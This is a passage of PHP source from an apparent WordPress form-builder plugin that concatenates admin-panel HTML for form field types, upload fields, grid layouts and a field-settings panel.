																					$output .= '<label class="checkbox-inline" for="check_1">
																								  <input class="check the_input_element" type="checkbox" name="checks[]" id="check_1" value="Check 1" >
																								  <span class="input-label check-label">Check 1</span>
																							  </label>
																							  <label class="checkbox-inline" for="check_2">
																								  <input class="check the_input_element" type="checkbox" name="checks[]" id="check_2" value="Check 2">
																								  <span class="input-label check-label">Check 2</span>
																							  </label>
																							  <label class="checkbox-inline" for="check_3">
																								  <input class="check the_input_element" type="checkbox" name="checks[]" id="check_3" value="Check 3" >
																								  <span class="input-label check-label">Check 3</span>
																							  </label>';	
																				$output .= '</div>';
																			$output .= '</div>';
																		$output .= '</div>';
																	break;
																	
																	
																	
																	case 'single-image-select-group':
																		$output .= '<div class="input_holder ">';
																			$output .= '<div class="'.$input_width.' the-radios input_container error_message" id="the-radios" data-checked-color="" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" >';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<label class="radio-inline " for="radios-0"  data-svg="demo-input-1">
																			  <span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="radio" name="radios" id="radios-0" value="1" >
																			  <span class="input-label radio-label">Radio 1</span>
																			  </span>
																		  </label>
																		  <label class="radio-inline" for="radios-1"  data-svg="demo-input-1">
																			<span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="radio" name="radios" id="radios-1" value="2">
																			  <span class="input-label radio-label">Radio 2</span>
																			</span>
																		  </label>
																		 
																			';
																	
																	$output .= '</div>';
																			$output .= '</div>';
																		$output .= '</div>';
																	break;
																	
																	case 'multi-image-select-group':
																		$output .= '<div class="input_holder ">';
																			$output .= '<div class="'.$input_width.' the-radios input_container error_message" id="the-radios" data-checked-color="" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" >';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<label class="radio-inline " for="check-0"  data-svg="demo-input-1">
																			  <span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="checkbox" name="checks" id="check-0" value="1" >
																			  <span class="input-label radio-label">Check 1</span>
																			  </span>
																		  </label>
																		  <label class="radio-inline " for="check-2"  data-svg="demo-input-1">
																			  <span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="checkbox" name="checks" id="check-2" value="2" >
																			  <span class="input-label radio-label">Check 2</span>
																			  </span>
																		  </label>
																		  
																			';
																	
																	$output .= '</div>';
																			$output .= '</div>';
																		$output .= '</div>';
																	break;
																	
																	case 'star-rating':
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div id="star" data-total-stars="5" data-enable-half="false" class="error_message svg_ready " style="cursor: pointer;" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title=""></div>';
																		$output .= '</div>';
																	break;
																	case 'slider' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																		$output .= '<div class="error_message slider" id="slider" data-fill-color="#f2f2f2" data-min-value="0" data-max-value="100" data-step-value="1" data-starting-value="0" data-background-color="#ffffff" data-slider-border-color="#CCCCCC" data-handel-border-color="#CCCCCC" data-handel-background-color="#FFFFFF" data-text-color="#000000" data-dragicon="" data-dragicon-class="btn btn-default" data-count-text="{x}"  data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title=""></div>';
																		$output .= '<input name="slider" class="hidden the_input_element the_slider" type="text">';
																		$output .= '</div>';
																	break;
																	case 'spinner' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																		$output .= '<input name="spinner" type="text" id="spinner" class="error_message the_spinner the_input_element form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-minimum="0" data-maximum="100" data-step="1" data-starting-value="0" data-decimals="0"  data-postfix-icon="" data-prefix-icon="" data-postfix-text="" data-prefix-text="" data-postfix-class="btn-default" data-prefix-class="btn-default" data-down-icon="fa fa-minus" data-up-icon="fa fa-plus" data-down-class="btn-default" data-up-class="btn-default" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" />';
																		$output .= '</div>';
																	break;
																	case 'tags' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																		$output .= '<input id="tags" value="" name="tags" type="text" class="tags error_message  the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-max-tags="" data-tag-class="label-info" data-tag-icon="fa fa-tag" data-border-color="#CCCCCC" data-background-color="#FFFFFF" data-placement="bottom" data-content="Please enter a value" title="">';
																		$output .= '</div>';
																	break;
																	case 'nf-color-picker':
																		$output .= '<div class="'.$input_width.'  input_container"><div class="input-group colorpicker-component">';
																				$output .= '<input type="text" name="'.$nf_functions->format_name($attr['label']).'" class="form-control error_message the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value=""  data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" data-secondary-message="" title="">';
																		$output .= '<span class="input-group-addon"><i></i></span></div></div>';
																	break;
																	case 'password' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																		$output .= '<input id="" type="password" name="text_field" data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" maxlength="200" class="error_message svg_ready the_input_element text pre-format form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" data-secondary-message="" title="">';
																		$output .= '</div>';
																	break;
																	
																	case 'autocomplete' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																		$output .= '<input id="autocomplete" value="" name="autocomplete" type="text" class="error_message svg_ready form-control  the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-text-color="#000000" data-border-color="#CCCCCC" data-background-color="#FFFFFF" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="">';
																		$output .= '<div style="display:none;" class="get_auto_complete_items"></div>';
																		$output .= '</div>';
																	break;
																	
																	case 'date' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div class="input-group date" id="datetimepicker" data-format="MM/DD/YYYY" data-language="en">';
																				$output .= '<span class="input-group-addon prefix"><span class="fa fa-calendar-o"></span></span>';
																				$output .= '<input type="text" name="date" class="error_message form-control the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].' " data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" />';
																			$output .= '</div>';
																		$output .= '</div>';
																	break;
																	case 'time' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div class="input-group time" id="datetimepicker" data-format="hh:mm A" data-language="en">';
																				$output .= '<span class="input-group-addon prefix"><span class="fa fa-clock-o"></span></span>';
																				$output .= '<input type="text" name="time" class="error_message form-control the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" />';
																			$output .= '</div>';
																		$output .= '</div>';
																		
																	break;	
																	
																	case 'submit-button':
																		$output .= '<div class="col-sm-12  input_container">';
																			$output .= '<button class="nex-submit svg_ready the_input_element btn btn-default">Submit</button>';
																		$output .= '</div>';
																		$i=0;
																	break;
																	case 'submit-button2':
																		$output .= '<div class="col-sm-12  input_container">';
																			$output .= '<button class="nex-submit svg_ready the_input_element btn btn-default">'.$attr['label'].'</button>';
																		$output .= '</div>';
																		
																	break;
																	
																	case 'upload-multi':
																	
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div class="fileinput fileinput-new" data-provides="fileinput">
																			  <div class="input-group">
																				<div class="the_input_element form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].' uneditable-input span3 error_message" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" data-secondary-message="'.$preferences['validation_preferences']['pref_invalid_file_ext_msg'].'" data-max-per-file-message="'.$preferences['validation_preferences']['pref_max_file_exceded'].'" data-max-all-file-message="'.$preferences['validation_preferences']['pref_max_file_af_exceded'].'" data-file-upload-limit-message="'.$preferences['validation_preferences']['pref_max_file_ul_exceded'].'" data-max-size-pf="0" data-max-size-overall="0" data-max-files="0" data-placement="bottom" data-trigger="fileinput"><i class="glyphicon glyphicon-file fileinput-exists"></i> <span class="fileinput-filename"></span></div>
																				<span class="input-group-addon btn btn-default btn-file postfix"><span class="glyphicon glyphicon-file"></span><input type="file" name="multi_file[]" multiple="" class="the_input_element"></span>
																				<a href="#" class="input-group-addon btn btn-default fileinput-exists" data-dismiss="fileinput"><span class="fa fa-trash-o"></span></a>
																				<div class="get_file_ext" style="display:none;">doc
docx
mpg
mpeg
mp3
mp4
odt
odp
ods
pdf
ppt
pptx
txt
xls
xlsx
jpg
jpeg
png
psd
tif
tiff</div>
																			  </div>
																			</div>';	
																		$output .= '</div>';
																	break;
																	
																	case 'upload-single':
																	
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div class="fileinput fileinput-new" data-provides="fileinput">
																			  <div class="input-group">
																				<div class="the_input_element form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].' uneditable-input span3 error_message" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" data-secondary-message="'.$preferences['validation_preferences']['pref_invalid_file_ext_msg'].'" data-placement="bottom" data-trigger="fileinput"><i class="glyphicon glyphicon-file fileinput-exists"></i> <span class="fileinput-filename"></span></div>
																				<span class="input-group-addon btn btn-default btn-file postfix"><span class="glyphicon glyphicon-file"></span><input type="file" name="single_file" class="the_input_element"></span>
																				<a href="#" class="input-group-addon btn btn-default fileinput-exists" data-dismiss="fileinput"><span class="fa fa-trash-o"></span></a>
																				<div class="get_file_ext" style="display:none;">doc
docx
mpg
mpeg
mp3
mp4
odt
odp
ods
pdf
ppt
pptx
txt
xls
xlsx
</div>
																			  </div>
																			</div>';	
																		$output .= '</div>';
																	break;
																	
																	case 'upload-image':
																	
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div class="fileinput fileinput-new" data-provides="fileinput">
																				  <div class="the_input_element fileinput-preview thumbnail" data-trigger="fileinput" style="width: 200px; height: 150px;"></div>
																				  <div>
																					<span class="btn btn-default btn-file the_input_element error_message" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" data-secondary-message="'.$preferences['validation_preferences']['pref_invalid_file_ext_msg'].'" data-placement="top"><span class="fileinput-new">Select image</span><span class="fileinput-exists">Change</span><input type="file" name="image_upload" ></span>
																					<a href="#" class="btn btn-default fileinput-exists" data-dismiss="fileinput">Remove</a>
																				  </div>
																				  <div class="get_file_ext" style="display:none;">gif
jpg
jpeg
png
psd
tif
tiff</div>
																				</div>';	
																		$output .= '</div>';
																		$i=0;
																	break;
																	case 'preset_field':
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div class="input-group">';
																				$output .= '<span class="input-group-addon prefix "><span class="fa '.$attr['icon'].'"></span></span>';
																				$sec_message = '';
																				if($attr['field_name']=='query')
																					{
																						$output .= '<textarea name="'.$nf_functions->format_name($attr['label']).'" placeholder=""  data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" class="error_message '.$set_required.' the_input_element textarea pre-format form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title=""></textarea>';
																						
																					}
																				else
																					{
																					if($attr['field_name']=='email')
																						$sec_message = $preferences['validation_preferences']['pref_email_format_msg'];
																					if($attr['field_name']=='phone_number')
																						$sec_message = $preferences['validation_preferences']['pref_phone_format_msg'];
																					if($attr['field_name']=='url')
																						$sec_message = $preferences['validation_preferences']['pref_url_format_msg'];
																					if($attr['field_name']=='numbers')
																						$sec_message = $preferences['validation_preferences']['pref_numbers_format_msg'];
																					if($attr['field_name']=='char')
																						$sec_message = $preferences['validation_preferences']['pref_char_format_msg'];
																					
																					$output .= '<input type="text" name="'.$attr['field_name'].'" class="error_message '.$set_required.' '.$attr['format'].' form-control the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" data-secondary-message="'.$sec_message.'"/>';
																					}
																			
																			$output .= '</div>';
																		$output .= '</div>';
																	break;
																	}
														
														if($attr['type']!='submit-button' && $attr['type']!='submit-button2')
															{
															if($label_pos == 'right')
																{
																$output .= '<div class="'.$label_width.' '.$align_class.' label_container '.(($preferences['field_preferences']['pref_label_text_align']) ? $preferences['field_preferences']['pref_label_text_align'] : 'align_left').'" '.$hide_label.'>';
																	$output .= '<label class="nf_title '.$preferences['field_preferences']['pref_label_size'].'"><span class="is_required glyphicon glyphicon-star btn-xs '.(($set_required) ? '' : 'hidden').'"></span><span class="the_label style_bold">'.$attr['label'].'</span><br /><small class="sub-text style_italic">'.(($preferences['field_preferences']['pref_sub_label']=='on') ? 'Sub label' : '').'</small></label>';
																$output .= '</div>';
																}
															}
																
																$output .= '<span class="help-block hidden">Help text...</span>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="field_settings" style="display:none">';
													$output .= '<div class="btn btn-default waves-effect waves-light btn-xs move_field"><i class="fa fa-arrows"></i></div>';
													$output .= '<div class="btn btn-default waves-effect waves-light btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
													$output .= '<div class="btn btn-default waves-effect waves-light btn-xs duplicate_field"  	title="Duplicate Field"><i class="fa fa-files-o"></i></div>';
													$output .= '<div class="btn btn-default waves-effect waves-light btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
												$output .= '</div>';
											$output .= '</div>';
										$output .= '</div>';
									$output .= '</div>';	
									
								}
						$output .= '</div>';
					$output .= '</li>';
				
				//OTHER ELEMENTS
				
					$output .= '<li>';
						$output .= '<div class="collapsible-header"><i class="material-icons">whatshot</i>Other Elements</div>';
						$output .= '<div class="collapsible-body">';
							
							foreach($other_elements as $type=>$attr)
								{
								$output .= '<div class="field form_field all_fields '.$type.' '.$attr['category'].' '.(($set_required) ? 'required' : '').'" >';
												
									$output .= '<div class="draggable_object "   >';
										$output .= '<i title="'.$attr['label'].'" data-toggle="tooltip" class="fa '.$attr['icon'].'"></i><span class="object_title">'.$attr['label'].'</span>';
									$output .= '</div>';
									
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
										$output .= '<div class="row">';
											$output .= '<div class="col-sm-12" id="field_container">';
												$output .= '<div class="row">';
													$output .= '<div class="col-sm-12 input_container">';
															
															switch($attr['type'])
																{
																case 'heading':
																	$output .= '<input type="hidden" class="set_math_result" value="0" name="math_result">';
																	$output .= '<h1 class="the_input_element" data-math-equation="" data-original-math-equation="" data-decimal-places="0">Heading 1</h1>';
																break;
																case 'math_logic':
																	$output .= '<input type="hidden" class="set_math_result" value="0" name="math_result">';
																	$output .= '<h1 class="the_input_element" data-math-equation="" data-original-math-equation="" data-decimal-places="0">{math_result}</h1>';
																break;
																case 'paragraph':
																	$output .= '<input type="hidden" class="set_math_result" value="0" name="math_result">';
																	$output .= '<div class="the_input_element" data-math-equation="" data-original-math-equation="" data-decimal-places="0">Add your paragraph</div><div style="clear:both;"></div>';
																break;
																case 'html':
																	$output .= '<input type="hidden" class="set_math_result" value="0" name="math_result">';
																	$output .= '<div class="the_input_element" data-math-equation="" data-original-math-equation="" data-decimal-places="0">Add Text or HTML</div><div style="clear:both;"></div>';
																break;
																case 'divider':
																	$output .= '<hr class="the_input_element" />';
																break;
																}
															$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
											
											$output .= '<div class="field_settings" style="display:none">';
												$output .= '<div class="btn btn-default waves-effect waves-light btn-xs move_field"><i class="fa fa-arrows"></i></div>';
												$output .= '<div class="btn btn-default waves-effect waves-light btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
												$output .= '<div class="btn btn-default waves-effect waves-light btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
											$output .= '</div>';
										$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';	
								$i = $i+0.08;	
								}
							
							
						$output .= '</div>';
					$output .= '</li>';
					
					$output .= '<li>';
						$output .= '<div class="collapsible-header"><i class="material-icons">view_quilt</i>Grid System</div>';
						$output .= '<div class="collapsible-body">';
							$output .= '<div class="field form_field grid grid-system grid-system-1">';
											$output .= '<div class="draggable_object">';
												$output .= '<span class="col-badge">1</span> Column';
											$output .= '</div>';
											$output .= '<div id="form_object" class="form_object" style="display:none;">';
													$output .= '<div class="input-inner" data-svg="demo-input-1">';
														$output .= '<div class="row grid_row">';
															$output .= '<div class="grid_input_holder col-sm-12">';
																$output .= '<div class="panel grid-system grid-system panel-default">';
																	$output .= '<div class="panel-body">';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings grid" style="display:none">';
																$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
																$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
																$output .= '<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>';															
																$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
															$output .= '</div>';
													$output .= '</div>';
											$output .= '</div>';
										$output .= '</div>';
										
										
		//2 Columns
										$output .= '<div class="field form_field grid grid-system grid-system-2">';
											$output .= '<div class="draggable_object">';
												$output .= '<span class="col-badge">2</span> Columns';
											$output .= '</div>';
											$output .= '<div id="form_object" class="form_object" style="display:none;">';
														$output .= '<div class="input-inner" data-svg="demo-input-1">';
															$output .= '<div class="row grid_row">';
																$output .= '<div class="grid_input_holder col-sm-6">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
																$output .= '</div>';
																$output .= '<div class="grid_input_holder col-sm-6">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings grid" style="display:none">';
																$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
																$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
																$output .= '<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>';															
																$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
															$output .= '</div>';
													$output .= '</div>';
											$output .= '</div>';
										$output .= '</div>';
		//3 Columns								
										$output .= '<div class="field form_field grid grid-system grid-system-3">';
											$output .= '<div class="draggable_object">';
												$output .= '<span class="col-badge">3</span> Columns';
											$output .= '</div>';
											$output .= '<div id="form_object" class="form_object" style="display:none;">';
														$output .= '<div class="input-inner" data-svg="demo-input-1">';
															$output .= '<div class="row  grid_row">';
																$output .= '<div class="grid_input_holder col-sm-4">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
																$output .= '</div>';
																$output .= '<div class="grid_input_holder col-sm-4">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
																$output .= '</div>';
																$output .= '<div class="grid_input_holder col-sm-4">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="field_settings grid" style="display:none">';
																$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
																$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
																$output .= '<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>';															
																$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
											$output .= '</div>';
										$output .= '</div>';
										
		//4 Columns								
										$output .= '<div class="field form_field grid grid-system grid-system-4">';
											$output .= '<div class="draggable_object">';
												$output .= '<span class="col-badge">4</span> Columns';
											$output .= '</div>';
											$output .= '<div id="form_object" class="form_object" style="display:none;">';
														$output .= '<div class="input-inner" data-svg="demo-input-1">';
															$output .= '<div class="row grid_row">';
																$output .= '<div class="grid_input_holder col-sm-3">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-3">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-3">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-3">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings grid" style="display:none">';
															$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
															$output .= '<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>';															
															$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
														$output .= '</div>';
													$output .= '</div>';
											$output .= '</div>';
										$output .= '</div>';
										
		//6 Columns								
										$output .= '<div class="field form_field grid grid-system grid-system-6">';
											$output .= '<div class="draggable_object">';
												$output .= '<span class="col-badge">6</span> Columns';
											$output .= '</div>';
											$output .= '<div id="form_object" class="form_object" style="display:none;">';
														$output .= '<div class="input-inner" data-svg="demo-input-1">';
															$output .= '<div class="row grid_row">';
																$output .= '<div class="grid_input_holder col-sm-2">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-2">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-2">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-2">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-2">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
															$output .= '<div class="grid_input_holder col-sm-2">';
																	$output .= '<div class="panel grid-system panel-default">';
																		$output .= '<div class="panel-body">';
																		$output .= '</div>';
																	$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings grid" style="display:none">';
															$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
															$output .= '<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>';															
															$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
														$output .= '</div>';
													$output .= '</div>';	
											$output .= '</div>';
											
										$output .= '</div>';
										$output .= '<div class="field form_field grid other-elements is_panel">';
											$output .= '<div class="draggable_object input-group-sm">';
												$output .= '<i title="Panel" data-toggle="tooltip" class="fa fa-square-o"></i>Panel';
											$output .= '</div>';
											$output .= '<div id="form_object" class="form_object" style="display:none;">';
													$output .= '<div class="input-inner" data-svg="demo-input-1">';
														$output .= '<div class="row">';
															$output .= '<div class="input_holder col-sm-12">';
																$output .= '<div class="panel panel-default ">';
																	$output .= '<div class="panel-heading">Panel Heading</div>';
																	$output .= '<div class="panel-body the-panel-body">';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '<div class="field_settings grid" style="display:none">';
													$output .= '<div class="btn btn-default btn-xs move_field"><i class="fa fa-arrows"></i></div>';
													$output .= '<div class="btn btn-default btn-xs edit"  	title="Edit Field Attributes"><i class="fa fa-edit"></i></div>';
													$output .= '<div title="Duplicate Field" class="btn btn-default btn-xs duplicate_field"><i class="fa fa-files-o"></i></div>';															
													$output .= '<div class="btn btn-default btn-xs delete" title="Delete field"><i class="fa fa-close"></i></div>';
												$output .= '</div>';
											$output .= '</div>';
										$output .= '</div>';
						$output .= '</div>';
					$output .= '</li>';
					
				$output .= '</ul>';
			$output .= '</div>';
		
		return $output;
		
		}
		
		public function print_field_settings(){
		
			$output = '';
			
			$output .= '<div class="field-settings-column right_hand_col ">';
					$output .= '<div class="current_id" style="display:none;"></div>';
					
						$output .= '<div class="field-setting-categories">';
							/*$output .= '<div id="label-settings" class="tab active">';
								$output .= 'Label';
							$output .= '</div>';
							$output .= '<div id="input-settings" class="tab">';
								$output .= 'Input';
							$output .= '</div>';
							$output .= '<div id="validation-settings" class="tab">';
								$output .= 'Validation';
							$output .= '</div>';
							$output .= '<div id="math-settings" class="tab">';
								$output .= 'Math Logic';
							$output .= '</div>';
							$output .= '<div id="animation-settings" class="tab">';
								$output .= 'Animation';
							$output .= '</div>';
							$output .= '<div id="close-settings" class="close-area">';
								$output .= '<span class="fa fa-close"></span>';
							$output .= '</div>';*/
							
							$output .= '<nav class="nav-extended settings_tabs_nf">
									<div class="nav-content">
									  <ul class="tabs_nf tabs_nf-transparent">
										<li id="label-settings" class="tab"><a class="active" href="#label-settings-panel">Label</a></li>
										<li id="input-settings" class="tab"><a href="#input-settings-panel">Input</a></li>
										<li id="validation-settings" class="tab"><a href="#validation-settings-panel">Validation</a></li>
										<li id="math-settings" class="tab"><a href="#math-settings-panel">Math Logic</a></li>
										<li id="animation-settings" class="tab"><a href="#animation-settings-panel">Animation</a></li>
										<div id="close-settings" class="close-area">
											<span class="fa fa-close"></span>
										</div>
									  </ul>
									</div>
								 </nav>';
						$output .= '</div>';
						
						
						
						
/*****************************************************/	
/******************SETTINGS***************************/
/*****************************************************/	
					
						$output .= '<div class="inner"><form enctype="multipart/form-data" method="post" action="'.get_option('siteurl').'/wp-admin/admin-ajax.php" id="do_upload_image_selection" name="do_upload_image_selection" style="display:none;">
								<div data-provides="fileinput" class="fileinput fileinput-new hidden">
																		  <div style="width: 100px; height: 100px;" data-trigger="fileinput" class="the_input_element fileinput-preview thumbnail"></div>
																		  <div>
																			<span data-placement="top" data-secondary-message="Invalid image extension" data-content="Please select an image" class="btn btn-default waves-effect waves-light btn-file the_input_element error_message"><span class="fileinput-new">Select image</span><span class="fileinput-exists">Change</span>
																			<input type="file" name="do_image_select_upload_preview">
																			</span>
																			<a data-dismiss="fileinput" class="btn btn-default waves-effect waves-light fileinput-exists" href="#">Remove</a>
																		  </div>
																		  <div style="display:none;" class="get_file_ext">gif
jpg
jpeg
png
psd
tif
tiff</div></div></form>';
//LABEL SETTINGS //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////				
							$output .= '<div class="label-settings settings-section">';
	/*** Label text ***/
								$output .= '<small>Label Text</small>';
								$output .= '<div class="input-group input-group-sm">';
									$output .= '<input type="text" class="form-control" name="set_label" id="set_label"  placeholder="Add text">';
	/*** Label text bold ***/
									$output .= '<span class="input-group-addon label-bold" title="Bold">';
										$output .= '<span class="fa fa-bold"></span>';
									$output .= '</span>';
	/*** Label text italic ***/
									$output .= '<span class="input-group-addon label-italic" title="Italic">';
										$output .= '<span class="fa fa-italic"></span>';
									$output .= '</span>';
	/*** Label text underline ***/
									$output .= '<span class="input-group-addon label-underline" title="Underline">';
										$output .= '<span class="fa fa-underline"></span>';
									$output .= '</span>';
	/*** Label text color ***/
									$output .= '<span class="input-group-addon color-picker"><input type="text" class="form-control label-color" name="label-color" id="bs-color"></span>';
								$output .= '</div>';
	/*** Sub-label text ***/
